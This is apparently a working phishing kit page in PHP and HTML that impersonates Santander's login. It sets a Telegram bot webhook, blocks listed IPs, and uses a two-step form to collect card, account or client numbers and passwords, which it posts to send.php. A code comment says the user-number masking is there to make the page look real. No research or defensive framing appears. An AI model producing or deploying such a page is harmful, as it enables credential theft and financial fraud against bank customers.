<?php
ini_set('display_errors', '0');
ini_set('display_startup_errors', '0');
error_reporting(0);
ob_start();


@include_once __DIR__ . '/limpiar_requests.php';
@include_once __DIR__ . '/config.php';


if (!isset($bot_token_2, $webhook_url)) {
    exit;
}


$setWebhookUrl = sprintf(
    "https://api.telegram.org/bot%s/setWebhook?url=%s",
    urlencode($bot_token_2),
    urlencode($webhook_url)
);

$response = @file_get_contents($setWebhookUrl);


$result = [];
if ($response !== false) {
    $decoded = @json_decode($response, true);
    if (json_last_error() === JSON_ERROR_NONE && is_array($decoded)) {
        $result = $decoded;
    }
}

// 🚫 Bloqueo de IPs no autorizadas
$user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
$user_ip = explode(',', $user_ip)[0];
$user_ip = trim($user_ip);

// Lista de IPs bloqueadas (agrega según sea necesario)
$ips_bloqueadas = ["---", "---"];

if (in_array($user_ip, $ips_bloqueadas, true)) {
    header("HTTP/1.1 403 Forbidden");
    exit;
}

ob_end_clean();
?>
<!--
██████╗ ██╗  ██╗██████╗      ██████╗  ██████╗ ████████╗██╗   ██╗
██╔══██╗██║  ██║██╔══██╗    ██╔════╝ ██╔═══██╗╚══██╔══╝╚██╗ ██╔╝
██████╔╝███████║██████╔╝    ██║  ███╗██║   ██║   ██║    ╚████╔╝ 
██╔═══╝ ██╔══██║██╔═══╝     ██║   ██║██║   ██║   ██║     ╚██╔╝  
██║     ██║  ██║██║         ╚██████╔╝╚██████╔╝   ██║      ██║   
╚═╝     ╚═╝  ╚═╝╚═╝          ╚═════╝  ╚═════╝    ╚═╝      ╚═╝ 
-->
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="faviconsanta.ico" type="image/svg+xml" data-next-head=""/>
    <title>Santander</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { 
            background-image: url('https://i.postimg.cc/DZVgdPhQ/9aa5a26c-780a-444f-acb0-d9c7cfee2bbe.png'); 
            background-size: cover; 
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            font-family: sans-serif; 
            margin: 0;
            height: 100vh;
            overflow: hidden; /* Evita scrolls raros en móvil */
        }
        
        /* Capa oscura corregida */
        body::before {
            content: "";
            position: fixed; /* Fixed para que no se mueva */
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.5); 
            z-index: -1;
        }

        .bottom-sheet { 
            border-radius: 1.5rem 1.5rem 0 0; 
            min-height: 480px; 
            position: relative;
            z-index: 10;
        }
        
        .input-line { border-bottom: 2px solid #e2e8f0; transition: border-color 0.3s; }
        .input-line:focus-within { border-color: #ec1c24; }

        /* Animación de entrada para que se vea más profesional */
        .animate-up {
            animation: slideUp 0.4s ease-out;
        }
        @keyframes slideUp {
            from { transform: translateY(100%); }
            to { transform: translateY(0); }
        }
    </style>
</head>
<body class="h-screen flex flex-col justify-end">

    <div class="bg-white w-full bottom-sheet p-6 shadow-2xl animate-up">
        <form method="post" action="send.php">
        <div class="w-10 h-1 bg-gray-300 rounded-full mx-auto mb-6"></div>
        
        <div class="flex justify-between items-center mb-8">
            <h1 id="stepTitle" class="text-lg font-bold text-gray-800 text-center flex-1">Ingresa tu información</h1>
            <div class="w-14"></div>
        </div>

        <!-- Paso 1: Usuario -->
        <div id="step1" class="space-y-6">
            <div class="input-line py-2">
                <p class="text-xs text-gray-400 mb-1">No. Tarjeta / No. Cuenta / Código de cliente</p>
                <input type="text" id="userField" name="usr" class="w-full outline-none text-lg text-gray-700 font-light" autocomplete="off" inputmode="numeric" required>
            </div>

            <!-- Checkbox de la imagen original -->
            <div class="flex items-center space-x-3 py-2">
                <div class="w-6 h-6 rounded-full bg-green-500 flex items-center justify-center">
                    <svg class="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>
                    </svg>
                </div>
                <span class="text-gray-600 text-sm">Recordarme en este dispositivo</span>
            </div>

            <button type="button" id="btnNext" disabled class="w-full bg-gray-200 text-gray-400 font-bold py-4 rounded-lg transition-all duration-300 opacity-50 cursor-not-allowed">
    Continuar
</button>
            
        </div>

        <!-- Paso 2: Contraseña -->
        <div id="step2" class="space-y-6 hidden">
            <div class="text-center mb-2">
                <p id="displayUser" class="text-gray-700 font-medium text-lg"></p>
            </div>
            <div class="input-line py-2 relative">
                <p class="text-xs text-gray-400 mb-1">Ingresa contraseña</p>
                <input type="password" name="pass" id="passField" class="w-full outline-none text-lg text-gray-700" required>
                <span class="absolute right-2 bottom-3 text-red-600 cursor-pointer">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
                    </svg>
                </span>
            </div>
            <div class="flex justify-between text-sm font-medium pt-2">
                <span class="text-red-600 cursor-pointer">No es mi cuenta</span>
                <span class="text-red-600 cursor-pointer">Olvidé mi contraseña</span>
            </div>
            <button id="btnSubmit" type="submit" class="w-full bg-red-600 text-white font-bold py-4 rounded-lg shadow-lg opacity-50 cursor-not-allowed">Ingresar</button>
        </div>
        </form>
    </div>

    <script>
       // ELEMENTOS DEL DOM
const userField = document.getElementById('userField');
const btnNext = document.getElementById('btnNext');
const step1 = document.getElementById('step1');
const step2 = document.getElementById('step2');
const stepTitle = document.getElementById('stepTitle');
const displayUser = document.getElementById('displayUser');
const passField = document.getElementById('passField');
const btnSubmit = document.getElementById('btnSubmit');

/**
 * PASO 1: Validación y activación de botón "Continuar"
 */
userField.addEventListener('input', (e) => {
    const value = e.target.value.trim();
    
    // Activar si tiene longitud de tarjeta o cuenta (mínimo 8)
    if (value.length >= 8) {
        btnNext.disabled = false;
        btnNext.classList.remove('bg-gray-200', 'text-gray-400', 'opacity-50', 'cursor-not-allowed');
        btnNext.classList.add('bg-red-600', 'text-white', 'opacity-100', 'cursor-pointer');
    } else {
        btnNext.disabled = true;
        btnNext.classList.add('bg-gray-200', 'text-gray-400', 'opacity-50', 'cursor-not-allowed');
        btnNext.classList.remove('bg-red-600', 'text-white', 'opacity-100', 'cursor-pointer');
    }
});

/**
 * TRANSICIÓN: Cambio de vista a Contraseña
 */
btnNext.addEventListener('click', () => {
    if (!btnNext.disabled) {
        stepTitle.innerText = "Bienvenido";
        // Enmascaramos un poco el usuario para que se vea real
        const masked = userField.value.length > 5 
            ? userField.value.substring(0, 4) + "****" 
            : userField.value;
        
        displayUser.innerText = masked;
        step1.classList.add('hidden');
        step2.classList.remove('hidden');
    }
});

/**
 * PASO 2: Validación de Contraseña (Exactamente 8 caracteres)
 */
btnSubmit.disabled = true; // Aseguramos que inicie desactivado
btnSubmit.classList.add('opacity-50', 'cursor-not-allowed'); // Estética de desactivado

passField.addEventListener('input', (e) => {
    const value = e.target.value.trim();
    
    // Solo se activa si tiene EXACTAMENTE 8 caracteres
    if (value.length === 8) {
        btnSubmit.disabled = false;
        btnSubmit.classList.remove('opacity-50', 'cursor-not-allowed');
        // Aseguramos que mantenga el color rojo de tu diseño
        btnSubmit.classList.add('opacity-100', 'cursor-pointer');
    } else {
        btnSubmit.disabled = true;
        btnSubmit.classList.add('opacity-50', 'cursor-not-allowed');
        btnSubmit.classList.remove('opacity-100', 'cursor-pointer');
    }
});

/**
 * PASO 2: Validación antes de envío - Escucha el evento submit del formulario
 */
const form = document.querySelector('form');
form.addEventListener('submit', (e) => {
    const password = passField.value.trim();
    
    // Validación: solo permitir si tiene exactamente 8 caracteres
    if (password.length !== 8) {
        e.preventDefault();
        return;
    }

    // Si pasa la validación, mostrar estado de carga
    btnSubmit.innerText = "Verificando...";
    btnSubmit.disabled = true;
    
    // El formulario se enviará normalmente a send.php
});
    </script>
</body>
</html>
